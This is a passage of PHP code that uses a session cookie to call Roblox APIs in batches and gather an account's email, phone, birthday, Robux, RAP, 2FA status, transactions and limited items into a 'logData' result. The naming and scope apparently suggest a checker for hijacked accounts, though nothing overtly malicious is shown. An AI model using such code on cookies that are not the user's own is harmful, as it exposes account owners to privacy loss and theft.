                $wave2Urls['place_icons_' . $idx] = 'https://thumbnails.roblox.com/v1/places/gameicons?placeIds=' . implode(',', $pChunk) . '&returnPolicy=PlaceHolder&size=150x150&format=Png';
            }
        }

        // 9. Missing Universe Place IDs resolution
        $missingUniversePlaceIds = [];
        foreach ($allTransactions as $tx) {
            if (!empty($tx['placeId']) && empty($tx['universeId'])) {
                $missingUniversePlaceIds[] = $tx['placeId'];
            }
        }
        $missingUniversePlaceIds = array_values(array_unique($missingUniversePlaceIds));
        foreach (array_slice($missingUniversePlaceIds, 0, 50) as $pid) {
            $wave2Urls['pu_' . $pid] = 'https://apis.roblox.com/universes/v1/places/' . urlencode((string)$pid) . '/universe';
        }

        // 10. Known Universes Info & Icons
        $knownUniverseIds = array_values(array_unique(array_filter($knownUniverseIds)));
        if (!empty($knownUniverseIds)) {
            $univChunks = array_chunk(array_slice($knownUniverseIds, 0, 100), 50);
            foreach ($univChunks as $idx => $uChunk) {
                $wave2Urls['games_info_' . $idx] = 'https://games.roblox.com/v1/games?universeIds=' . implode(',', $uChunk);
                $wave2Urls['games_icons_' . $idx] = 'https://thumbnails.roblox.com/v1/games/icons?universeIds=' . implode(',', $uChunk) . '&size=150x150&format=Png&isCircular=false';
            }
        }

        // Execute Consolidated Wave 2 with persistent auto-retry
        $wave2Responses = !empty($wave2Urls) ? self::multiGetRequestsWithAutoRetry($wave2Urls, $cookie, 4) : [];

        // Parse Wave 2 results into fast lookup maps
        $assetThumbMap = [];
        $bundleThumbMap = [];
        $gamePassThumbMap = [];
        $devProductThumbMap = [];
        $placeIconMap = [];
        $gameNameMap = [];
        $iconMap = [];
        $universeMapByPlace = [];
        $newUniverseIds = [];

        foreach ($wave2Responses as $k => $res) {
            if (str_starts_with($k, 'assets_') && isset($res['data']) && is_array($res['data'])) {
                foreach ($res['data'] as $thumb) {
                    if (isset($thumb['targetId']) && !empty($thumb['imageUrl'])) {
                        $assetThumbMap[$thumb['targetId']] = $thumb['imageUrl'];
                    }
                }
            } elseif (str_starts_with($k, 'bundles_') && isset($res['data']) && is_array($res['data'])) {
                foreach ($res['data'] as $thumb) {
                    if (isset($thumb['targetId']) && !empty($thumb['imageUrl'])) {
                        $bundleThumbMap[$thumb['targetId']] = $thumb['imageUrl'];
                    }
                }
            } elseif (str_starts_with($k, 'gamepasses_') && isset($res['data']) && is_array($res['data'])) {
                foreach ($res['data'] as $thumb) {
                    if (isset($thumb['targetId']) && !empty($thumb['imageUrl'])) {
                        $gamePassThumbMap[$thumb['targetId']] = $thumb['imageUrl'];
                    }
                }
            } elseif (str_starts_with($k, 'devproducts_') && isset($res['data']) && is_array($res['data'])) {
                foreach ($res['data'] as $thumb) {
                    if (isset($thumb['targetId']) && !empty($thumb['imageUrl'])) {
                        $devProductThumbMap[$thumb['targetId']] = $thumb['imageUrl'];
                    }
                }
            } elseif (str_starts_with($k, 'place_icons_') && isset($res['data']) && is_array($res['data'])) {
                foreach ($res['data'] as $pIcon) {
                    if (isset($pIcon['targetId']) && !empty($pIcon['imageUrl'])) {
                        $placeIconMap[$pIcon['targetId']] = $pIcon['imageUrl'];
                    }
                }
            } elseif (str_starts_with($k, 'games_info_') && isset($res['data']) && is_array($res['data'])) {
                foreach ($res['data'] as $g) {
                    if (isset($g['id'], $g['name'])) {
                        $gameNameMap[$g['id']] = $g['name'];
                    }
                }
            } elseif (str_starts_with($k, 'games_icons_') && isset($res['data']) && is_array($res['data'])) {
                foreach ($res['data'] as $icon) {
                    if (isset($icon['universeId'], $icon['imageUrl'])) {
                        $iconMap[$icon['universeId']] = $icon['imageUrl'];
                    } elseif (isset($icon['targetId'], $icon['imageUrl'])) {
                        $iconMap[$icon['targetId']] = $icon['imageUrl'];
                    }
                }
            } elseif (str_starts_with($k, 'pu_') && isset($res['universeId']) && is_numeric($res['universeId'])) {
                $pid = substr($k, 3);
                $uId = (int)$res['universeId'];
                $universeMapByPlace[$pid] = $uId;
                if (!in_array($uId, $knownUniverseIds, true) && !in_array($uId, $newUniverseIds, true)) {
                    $newUniverseIds[] = $uId;
                }
            }
        }

        // Apply universeId from place resolution
        if (!empty($universeMapByPlace)) {
            foreach ($allTransactions as &$tx) {
                if (!empty($tx['placeId']) && empty($tx['universeId']) && isset($universeMapByPlace[$tx['placeId']])) {
                    $tx['universeId'] = $universeMapByPlace[$tx['placeId']];
                }
            }
            unset($tx);
        }

        // === CONDITIONAL WAVE 3: Fetch info only for newly resolved universe IDs ===
        if (!empty($newUniverseIds)) {
            $wave3Urls = [];
            $newUnivChunks = array_chunk(array_slice($newUniverseIds, 0, 50), 50);
            foreach ($newUnivChunks as $idx => $nuChunk) {
                $wave3Urls['new_games_info_' . $idx] = 'https://games.roblox.com/v1/games?universeIds=' . implode(',', $nuChunk);
                $wave3Urls['new_games_icons_' . $idx] = 'https://thumbnails.roblox.com/v1/games/icons?universeIds=' . implode(',', $nuChunk) . '&size=150x150&format=Png&isCircular=false';
            }
            $wave3Responses = self::multiGetRequestsWithAutoRetry($wave3Urls, $cookie, 3);
            foreach ($wave3Responses as $k => $res) {
                if (str_starts_with($k, 'new_games_info_') && isset($res['data']) && is_array($res['data'])) {
                    foreach ($res['data'] as $g) {
                        if (isset($g['id'], $g['name'])) {
                            $gameNameMap[$g['id']] = $g['name'];
                        }
                    }
                } elseif (str_starts_with($k, 'new_games_icons_') && isset($res['data']) && is_array($res['data'])) {
                    foreach ($res['data'] as $icon) {
                        if (isset($icon['universeId'], $icon['imageUrl'])) {
                            $iconMap[$icon['universeId']] = $icon['imageUrl'];
                        } elseif (isset($icon['targetId'], $icon['imageUrl'])) {
                            $iconMap[$icon['targetId']] = $icon['imageUrl'];
                        }
                    }
                }
            }
        }

        // Populate Animation Thumbnails (check both bundle and asset maps for 100% resolution)
        foreach ($animations as &$anim) {
            $aId = $anim['id'];
            if (!empty($bundleThumbMap[$aId])) {
                $anim['thumbnail'] = $bundleThumbMap[$aId];
            } elseif (!empty($assetThumbMap[$aId])) {
                $anim['thumbnail'] = $assetThumbMap[$aId];
            }
        }
        unset($anim);

        // Populate SFX Item Thumbnails
        foreach ($sfxItems as &$sfx) {
            if (isset($assetThumbMap[$sfx['assetId']])) {
                $sfx['thumbnail'] = $assetThumbMap[$sfx['assetId']];
            }
        }
        unset($sfx);

        // Populate Transaction Thumbnails & Game Info
        foreach ($allTransactions as &$tx) {
            $aId = $tx['assetId'] ?? null;
            if ($aId) {
                $cleanType = strtolower(str_replace([' ', '_', '-'], '', (string)($tx['itemType'] ?? '')));
                if ($cleanType === 'gamepass' && isset($gamePassThumbMap[$aId])) {
                    $tx['thumbnail'] = $gamePassThumbMap[$aId];
                } elseif ($cleanType === 'developerproduct' && isset($devProductThumbMap[$aId])) {
                    $tx['thumbnail'] = $devProductThumbMap[$aId];
                } elseif ($cleanType === 'bundle' && isset($bundleThumbMap[$aId])) {
                    $tx['thumbnail'] = $bundleThumbMap[$aId];
                } elseif (isset($assetThumbMap[$aId])) {
                    $tx['thumbnail'] = $assetThumbMap[$aId];
                } elseif (isset($gamePassThumbMap[$aId])) {
                    $tx['thumbnail'] = $gamePassThumbMap[$aId];
                } elseif (isset($devProductThumbMap[$aId])) {
                    $tx['thumbnail'] = $devProductThumbMap[$aId];
                } elseif (isset($bundleThumbMap[$aId])) {
                    $tx['thumbnail'] = $bundleThumbMap[$aId];
                }
            }

            if (!empty($tx['universeId']) && isset($gameNameMap[$tx['universeId']]) && empty($tx['gameName'])) {
                $tx['gameName'] = $gameNameMap[$tx['universeId']];
            }

            $icon = '';
            if (!empty($tx['universeId']) && isset($iconMap[$tx['universeId']])) {
                $icon = $iconMap[$tx['universeId']];
            } elseif (!empty($tx['placeId']) && isset($placeIconMap[$tx['placeId']])) {
                $icon = $placeIconMap[$tx['placeId']];
            }
            if ($icon) {
                $tx['gameIcon'] = $icon;
            }
        }
        unset($tx);
        $details = [
            'username' => $username,
            'displayName' => $displayName,
            'ageGroup' => $ageGroup,
            'ageGroupChecked' => $isAgeChecked,
            'ageGroupStatus' => $ageGroupStatus,
            'birthday' => $birthday,
            'birthdayVerified' => $isBirthdayVerified,
            'birthdayStatus' => $birthdayStatus,
            'birthMonth' => $birthMonth,
            'birthDay' => $birthDay,
            'birthYear' => $birthYear,
            'email' => $email,
            'avatarUrl' => $avatarUrl,
            'fullAvatarUrl' => $fullAvatarUrl,
            'phone' => $phone,
            'emailVerified' => $emailVerified,
            'robux' => $robux,
            'pendingRobux' => $pendingRobux,
            'totalRAP' => $totalRAP,
            'twoFactor' => $twoFactor,
            'twoFA' => $twoFactor,
            'twoFAEnabled' => ($twoFactor !== 'None'),
            'premium' => $premium,
            'accountCredit' => $accountCredit,
            'totalIncome' => $totalIncome,
            'totalOutgoing' => $totalOutgoing,
            'incomingYear' => $yearlyTotals['incomingRobuxTotal'] ?? $totalIncome,
            'outgoingYear' => $yearlyTotals['outgoingRobuxTotal'] ?? $totalOutgoing,
            'yearlyTotals' => $yearlyTotals,
            'transactions' => $allTransactions,
            'animations' => $animations,
            'limitedItems' => $limitedItems,
            'sfxItems' => $sfxItems
        ];

        return ['logData' => $logData, 'details' => $details];
    }
}
